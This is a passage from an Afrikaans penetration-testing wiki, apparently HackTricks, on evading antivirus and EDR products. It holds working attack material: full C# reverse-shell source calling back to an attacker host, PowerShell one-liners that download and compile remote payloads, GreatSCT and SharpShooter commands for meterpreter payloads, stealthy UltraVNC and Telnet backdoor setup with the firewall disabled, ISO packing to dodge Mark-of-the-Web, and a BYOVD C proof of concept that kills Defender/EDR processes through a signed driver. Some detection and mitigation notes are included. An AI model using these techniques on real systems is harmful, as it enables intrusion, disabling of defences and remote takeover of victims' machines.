4.  Handmatige opruiming – voer die resulterende binêre lêer onder dnSpy uit en soek na groot Base64-blokke of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload op te spoor.  Dikwels stoor die malware dit as ’n TLV-geënkodeerde byte-skikking wat binne `<Module>.byte_0` geïnisialiseer word.

Hierdie ketting herstel die uitvoeringsvloei **sonder** dat die kwaadwillige sample uitgevoer hoef te word – nuttig wanneer jy op ’n offline werkstasie werk.

> 🛈  ConfuserEx skep ’n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as ’n IOC gebruik kan word om samples outomaties te triageer.

#### Eenreëlige opdrag
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-obfuskator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n oopbron-fork van die [LLVM](http://www.llvm.org/)-samestellingsuite te bied wat groter sagtewaresekuriteit kan bied deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe die `C++11/14`-taal gebruik kan word om tydens samestelling geobfuskeerde kode te genereer, sonder eksterne nutsmiddels of veranderinge aan die compiler.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag geobfuskeerde bewerkings by wat deur die C++-template-metaprogrammeringsraamwerk gegenereer word. Dit maak die lewe ’n bietjie moeiliker vir iemand wat die toepassing wil kraak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64-binêre obfuskator wat verskeie PE-lêers kan obfuskeer, insluitend .exe, .dll en .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorfiese kode-enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige kode-obfuskeringsraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer ’n program op samestellingskodevlak deur gewone instruksies in ROP-kettings om te skakel, wat ons natuurlike begrip van normale beheervloei verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE-crypter wat in Nim geskryf is.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL-lêers na shellcode omskakel en dit dan laai.

### LLVM-compilerondersteunde selfmaskering per funksie

In plaas daarvan om ’n volledige implant net te masker terwyl dit slaap, kan ’n aangepaste LLVM X86-backend geselekteerde funksies XOR-masker wanneer hulle onaktief is. Die Function Peekaboo PoC kies gedemangelde name wat `REG_` bevat, voeg posisie-onafhanklike in-/uittree-stubs om die finale masjienkode in, en lewer een gedeelde maskerhanteraar in `.text` uit; handtekeninge op bronkodevlak en die Windows x64-aanroepkonvensie bly onveranderd.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend-beheervloeitransformasie

Dit hoort ná instruksiekeuse en optimering, omdat die transformasie **elke gegenereerde return** moet dek en die presiese x86-uitleg moet ken. ’n `MachineFunctionPass` wat voor uitvoer plaasvind, vind die laaste `MachineInstr::isReturn()`, verwyder dit sodat die finale pad in die aangehegte epiloog invloei, en vervang vroeëre returns met `JMP_1 handler`. Behou enige compiler-gegenereerde stack/frame-afbreking vóór elke return; herlei net die return-instruksie self.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` en `emitFunctionBodyEnd()` lewer die stubs per funksie uit, terwyl `emitEndOfAsmFile()` die hanteraar lewer. Simbole wat tussen uitvoerfases gedeel word, laat ’n proloogvertakking toe om na sy latere epiloog te teiken; skryf vir ’n handmatig uitgelewerde near `je` `0F 84`, gevolg deur die viergreep-MC-uitdrukking `target - address_after_je`. Oproepe en spronge na die hanteraar kan eerder as `MCInst`-objekte (`CALL64pcrel32` en `JMP_1`) uitgelewer word. ’n Pass moet `false` teruggee vir ’n funksie wat nie gekies is nie, wanneer dit niks verander het nie; die PoC gee verkeerdelik `true` op daardie pad terug.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata en voor-CRT-inisialisering

Die PoC plaas ’n XOR-sleutel en rekords van 16 grepe met ’n deur die loader-herlokeerde funksiewyser plus ’n looptydlengte in `.funcmeta`. Hoewel die C-veld ’n `uint32_t` is, verkry die hanteraar ’n QWORD by rekordoffset `+8`, wat die lengte en sy padding verbruik, en skuif rekords met `0x10` aan. PE-afdelingsname beslaan net agt grepe, dus sien die looptydopsoek `.funcmet`. ’n Eksterne patcher voeg ’n uitvoerbare `.stub` by, stoor die ou toegangspunt-RVA in die stub en herlei `AddressOfEntryPoint`; die PIC-stub kry die beeldbasis van `gs:[0x60]` → `[PEB+0x10]`, loop deur PE32+-invoere om ’n reeds ingevoerde `VirtualProtect` op te spoor, en loop vóór die CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inisialisering stel ’n sentinel in `gs:[0xE8]` en roep elke metadata-funksie aan. Sy permanent leesbare proloog stoor die funksiebegin in `gs:[0xF0]`, bespeur die sentinel en slaan die nog ongedekodeerde liggaam oor. Die epiloog gebruik dan `call handler`; nadat die hanteraar 13 registers (`0x68` grepe) gestoor het, is die return-adres by `[rsp+0x68]` die einde van die getransformeerde funksie, sodat `end - start` in sy metadatarekord geskryf kan word. Die stub maak die sentinel skoon en spring na `ImageBase + original_entry_point_RVA` nadat al die liggame gemasker is.<sup>[[38]](#references)[[39]](#references)</sup>

Tydens ’n gewone oproep roep die proloog dieselfde simmetriese hanteraar aan om die liggaam te dekodeer. Die finale pad vloei in die aangehegte epiloog in, terwyl elke vroeëre return reguit na die gedeelde hanteraar spring. Die gewone epiloog gebruik ook `jmp handler` eerder as `call`; ná hervermaskering verbruik die hanteraar se `ret` die oorspronklike oproeper se return-adres en behou dit die funksieresultaat in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskeringsprimitief en ontledingsaanwysers

Die hanteraar vind die huidige rekord, slaan die vaste sigbare proloog (`0x46` grepe in hierdie bouwerk) oor, verander die res na `PAGE_EXECUTE_READWRITE`, XOR dit byte vir byte met die lae sleutelgreep, en stel dit dan op `PAGE_EXECUTE_READ`. Dieselfde lus dekodeer dus met toegang en enkodeer met elke normale uittrede.<sup>[[38]](#references)[[39]](#references)</sup>

Aanwysers met ’n hoë seinwaarde vir hierdie ontwerp sluit in:<sup>[[38]](#references)[[39]](#references)</sup>

- ’n toegangspunt binne ’n uitvoerbare `.stub` en ’n `.funcmet`-afdeling met ’n sleutel plus herlokeerde `.text`-wysers;
- voor-CRT-ontleding van die PEB, invoertabel en afdelingstabel, gevolg deur oproepe via elke metadatawyser;
- identiese PIC-proloë met `call`/`pop` en baie return-punte wat na een hanteraar herlei word;
- skrywes na `gs:[0xE8]`, `gs:[0xF0]` en `gs:[0xF8]`, gevolg deur herhaalde `VirtualProtect`-oorgange en bytewyse XOR-skrywes na beeldgesteunde uitvoerbare bladsye.

Dit ontduik geheueskandeerders; dit is nie kriptografiese beskerming nie: die gelapte lêer bevat steeds die oorspronklike onbedekte liggaam, en ’n debugger kan by `VirtualProtect` of die XOR-lus breek en die aktiewe funksie dump. Die enkelgreep-XOR, leesbare metadata en vaste `0x46`-grens maak ook vanlyn-herwinning eenvoudig.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die PoC se TEB-gleuwe is thread-local, maar die gewysigde kodebladsye is process-wide. Gelyktydige of rekursiewe toegang kan instruksies dus weer omskakel terwyl ’n ander aanroep dit uitvoer; uitsonderings en nieplaaslike uittredes kan ook hervermaskering omseil. ’n Robuuste implementering moet oorgange sinchroniseer, die beskerming herstel wat werklik via `lpflOldProtect` teruggegee is, hardgekodeerde stub-lengtes vermy, beide `call`- en `jmp`-paaie vir x64-stackbelyning oudit, en `FlushInstructionCache` aanroep nadat uitvoerbare grepe herskryf is. Microsoft stel dit uitdruklik die oproeper se verantwoordelikheid om instruksie-kas-koherensie te verseker wanneer uitvoerbare kode gewysig word.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen en MoTW

Jy het moontlik hierdie skerm gesien wanneer jy sommige uitvoerbare lêers van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om eindgebruikers te beskerm teen die uitvoering van moontlik kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen gebruik hoofsaaklik ’n reputasiegebaseerde benadering. Dit beteken dat toepassings wat selde afgelaai word SmartScreen sal aktiveer, wat die eindgebruiker waarsku en verhoed om die lêer uit te voer (hoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier, wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat uitvoerbare lêers wat met ’n **vertroude** ondertekeningsertifikaat onderteken is, **nie SmartScreen sal aktiveer nie**.

’n Baie doeltreffende manier om te keer dat jou payloads die Mark of The Web kry, is om hulle in ’n soort houer, soos ’n ISO, te verpak. Dit is omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS**-volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n nutsmiddel wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier is ’n demo vir die omseiling van SmartScreen deur payloads in ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige logmeganisme in Windows waarmee toepassings en stelselkomponente **gebeurtenisse kan aanteken**. Sekuriteitsprodukte kan dit egter ook gebruik om kwaadwillige aktiwiteite te monitor en op te spoor.

Net soos AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die user space-proses se **`EtwEventWrite`**-funksie onmiddellik te laat terugkeer sonder om enige gebeurtenisse aan te teken. Dit word gedoen deur die funksie in die geheue te patch sodat dit onmiddellik terugkeer, wat ETW-logging vir daardie proses effektief deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Dit is al lank bekend dat C#-binaries in die geheue gelaai kan word, en dit is steeds ’n baie goeie manier om jou post-exploitation-nutsgoed uit te voer sonder om deur AV opgespoor te word.

Aangesien die payload direk in die geheue gelaai word sonder om die skyf te raak, hoef ons net bekommerd te wees oor die patch van AMSI vir die hele proses.

Die meeste C2-frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in die geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels dat **’n nuwe opofferingsproses geskep word**, jou kwaadwillige post-exploitation-kode in daardie nuwe proses ingespuit word, jou kwaadwillige kode uitgevoer word en die nuwe proses beëindig word wanneer dit klaar is. Dit hou voordele én nadele in. Die voordeel van die fork and run-metode is dat uitvoering **buite** ons Beacon-implant-proses plaasvind. Dit beteken dat indien iets tydens ons post-exploitation-aksie verkeerd loop of opgespoor word, daar ’n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat daar ’n **groter kans** is dat jy deur **Behavioural Detections** opgespoor word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit behels dat die kwaadwillige post-exploitation-kode **in sy eie proses** ingespuit word. Só kan jy vermy om ’n nuwe proses te skep en dit deur AV te laat skandeer. Die nadeel is egter dat indien iets met die uitvoering van jou payload verkeerd loop, daar ’n **veel groter kans** is dat jy jou **beacon verloor**, aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor die laai van C# Assembly, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **vanuit PowerShell** laai. Kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Gebruik van ander programmeertale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die gekompromitteerde masjien toegang te gee **tot die interpreter-omgewing wat op die Aanvaller-beheerde SMB-share geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB-share toe te laat, kan jy **willekeurige kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender skandeer steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om statiese signatures te omseil**. Toetse met ewekansige, nie-geobfuskeerde reverse shell-scripts in hierdie tale was suksesvol.

## TokenStomping

Token stomping manipuleer die access token van ’n sekuriteitsproduk soos ’n EDR of AV. Deur die token se regte te verminder, kan die proses aan die gang bly, terwyl dit verhinder word om bevoorregte inspeksie- of remediëringsaksies uit te voer.

Om dit te voorkom, kan Windows **eksterne prosesse verhinder** om handles na tokens van sekuriteitsprosesse te verkry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gebruik van vertroude sagteware

### Chrome Remote Desktop

Soos beskryf in [**hierdie blogplasing**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op ’n slagoffer se rekenaar te ontplooi en dit dan te gebruik om beheer daaroor oor te neem en volharding te handhaaf:<sup>[[35]](#references)</sup>
1. Laai dit af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Laat die installeerder stilweg op die slagoffer se masjien loop (admin word vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik volgende. Die towenaar sal jou dan vra om te magtig; klik op die Authorize-knoppie om voort te gaan.
4. Voer die verskafte opdrag met die nodige aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (die `--pin`-parameter stel die PIN sonder die GUI in).
 

## Gevorderde ontduiking

Ontduiking is ’n baie ingewikkelde onderwerp. Soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is feitlik onmoontlik om in volwasse omgewings heeltemal onopgespoor te bly.

Elke omgewing waarteen jy te staan kom, sal sy eie sterk- en swakpunte hê.

Ek beveel sterk aan dat jy hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) gaan kyk om ’n vastrapplek in meer gevorderde ontduikingstegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ou tegnieke**

### **Kyk watter dele Defender as kwaadwillig beskou**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik. Dit sal **dele van die binary verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou, en dit aan jou uitwys.\
Nog ’n nutsding wat **dieselfde doen, is** [**avred**](https://github.com/dobin/avred), met ’n oop webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot en met Windows 10 het alle Windows-weergawes ’n **Telnet server** ingesluit wat jy (as administrateur) kon installeer deur die volgende uit te voer:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Laat dit **begin** wanneer die stelsel begin en **voer** dit nou uit:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Verander telnet-poort** (stealth) **en deaktiveer firewall**:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die setup nie)

**OP DIE HOST**: Voer _**winvnc.exe**_ uit en stel die server op:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in _VNC Password_
- Stel ’n wagwoord in _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **slagoffer**

#### **Omgekeerde verbinding**

Die **aanvaller** moet die binary `vncviewer.exe -listen 5900` **op sy host uitvoer** sodat dit **gereed sal wees** om ’n omgekeerde **VNC-verbinding** te ontvang. Begin dan binne die **slagoffer** die winvnc-daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit.

**WAARSKUWING:** Om stealth te behou, moet jy sekere dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [popup](https://i.imgur.com/1SROTTl.png) aktiveer. Kyk of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die config-venster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` vir hulp uitvoer nie, anders sal jy ’n [popup](https://i.imgur.com/oc18wcu.png) aktiveer

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Binne GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Begin nou die **listener** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Die huidige Defender sal die proses baie vinnig beëindig.**

### Ons eie reverse shell kompileer

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Gebruik dit met:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# met compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C#-obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik Python as voorbeeld om injectors te bou:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander nutsmiddels

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Skakel AV/EDR vanuit Kernel Space uit

Storm-2603 het ’n klein konsoleprogram genaamd **Antivirus Terminator** gebruik om endpoint-beskerming te deaktiveer voordat dit ransomware laat val het. Die instrument bring sy **eie kwesbare maar *getekende* driver** saam en misbruik dit om bevoorregte kernel-bewerkings uit te voer wat selfs AV-dienste met Protected-Process-Light (PPL) nie kan keer nie.<sup>[[12]](#references)</sup>

Belangrike punte
1. **Getekende driver**: Die lêer wat na die skyf geskryf word, is `ServiceMouse.sys`, maar die binêre lêer is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-handtekening het, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die eerste reël registreer die driver as ’n **kernel service**, en die tweede een begin dit sodat `\\.\ServiceMouse` vanuit user land toeganklik word.
3. **IOCTLs wat deur die driver beskikbaar gestel word**
   | IOCTL-kode | Vermoë |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beëindig ’n arbitrêre proses volgens PID (word gebruik om Defender/EDR-dienste te beëindig) |
   | `0x990000D0` | Verwyder ’n arbitrêre lêer op skyf |
   | `0x990001D0` | Laai die driver af en verwyder die diens |

   Minimale C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Waarom dit werk**: BYOVD omseil user-mode-beskermings heeltemal; kode wat in die kernel uitgevoer word, kan *beskermde* prosesse oopmaak, beëindig of kernel-objekte peuter, ongeag PPL/PP, ELAM of ander hardingskenmerke.

Opsporing / Versagting
•  Aktiveer Microsoft se lys met kwesbare drywers wat geblokkeer word (`HVCI`, `Smart App Control`), sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skep van nuwe *kernel*-dienste en waarsku wanneer ’n drywer vanaf ’n wêreldskryfbare gids gelaai word of nie op die toelys verskyn nie.
•  Hou dop vir user-mode-handvatsels na pasgemaakte toestelobjekte, gevolg deur verdagte `DeviceIoControl`-oproepe.

### Omseiling van Zscaler Client Connector se houdingskontroles deur binêre lêers op skyf te wysig

Zscaler se **Client Connector** pas toestelhoudingsreëls plaaslik toe en maak staat op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige omseiling moontlik:

1. Houdingsevaluering vind **heeltemal aan die kliëntkant** plaas (’n boolean word na die bediener gestuur).
2. Interne RPC-eindpunte bevestig net dat die uitvoerbare lêer wat koppel **deur Zscaler onderteken is** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Deur **vier ondertekende binêre lêers op skyf te wysig**, kan albei meganismes geneutraliseer word:

